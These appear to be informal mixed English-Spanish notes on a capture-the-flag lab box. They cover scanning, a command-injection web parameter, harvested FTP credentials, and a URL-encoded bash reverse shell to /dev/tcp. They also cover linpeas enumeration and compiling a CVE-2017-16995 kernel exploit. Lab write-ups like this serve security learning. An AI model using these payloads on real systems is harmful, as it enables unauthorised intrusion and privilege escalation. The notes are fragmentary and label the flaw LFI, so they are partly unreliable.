ENUMERATION
-netdiscover
-nmap -sV -sC
watch the server pt 80

FOOTHOLD

LFI local file inclusion vulnerability
(see more)
ls -al

/site/busca?php=buscar
192.168.100.38/site/wordpress
aparently the server of wordpress is disconected from the site or something like that , the page of wordpress /site/wordpress looks strange

cat wordpress/config.php
-config.php
username and password

-prueba con ftp conexion

pwd
/var/www/html

.backup
cat .backup
ftp conn
success
get user.txt (it downloads the files)

APARENTLY YOU CANNOT READ ARCHIVES WHEN YOU ARE IN THE SERVICE OF FTP
cat user.txt

TRY A REVERSE SHELL  

method 1 
we must log on ftp with the user , and password
go to the html folder
(uploading via ftp)
using php-reverse-shell.php

test.php

put test.php (with this command) 
(the user jangow does not have permissions to modify directorys)

DO NOT WORK 

METHOD 2 NETCAT reverse shell


Type nc (victimp ip) victim port (service runing , in this case ftp) 
nc 192.168.100.38  21
USER jangow01 (you must type USER)
PASS  the password(you must type PASS)
```C
cds@cds:~$ nc 192.168.100.42 21
220 (vsFTPd 3.0.3)
USER jangow01
331 Please specify the password.
PASS abygurl69
230 Login successful.
ls
500 Unknown command.
```

(but is not possible it doesnt work)

METHOD 3 using a bash shell script


te pones en escucha con netcat

"reverse shell Cheat Sheet" on google 
```c
/bin/bash -c 'bash -i >& /dev/tcp/192.168.100.4/443 0>&1'
```
EL COMANDO VA EN EL NAVEGADOR BUSCAR= 
(dice "scirpt it automatically translates the bash script to a string") 
there is a way to encode the bash url to a string

encoder to url (search on google)
https://www.urlencoder.org/

```
%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.100.4%2F443%200%3E%261%27
```

and load the code to the buster

and you have the revese shell

shel interactive
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm  (exporta una variable de terminal)

you must log with 
su jangow01 y password

($username = "jangow01";
$password = "abygurl69";)


PRIVILEGE SCALATION

-we are going to use a tool called lin pease
enumerates a big part of the process on the target system


THIS SCRIPT GIVES US A POSSIBLE PATH FOR PRIVILEDGE SCALATION

linpieas.sh (github)

SE TRANSFIERE POR FTP

-put linpeas.sh
(doesnt work)

cd /home/jangow
put linpeas.sh (now works)

./linpeas.sh

db database 

THE SCRIPT IS UPLOADED VIA FTP
ebpf_verifyer (upload script via ftp) 


IT IS NECESARY TO COMPILE THE DOWNLOADED SCRIPT

compile the script using gcc command line utility

![[compilar.png]]


gcc 45010.c  -o cve-2017-16995

execute the file




























































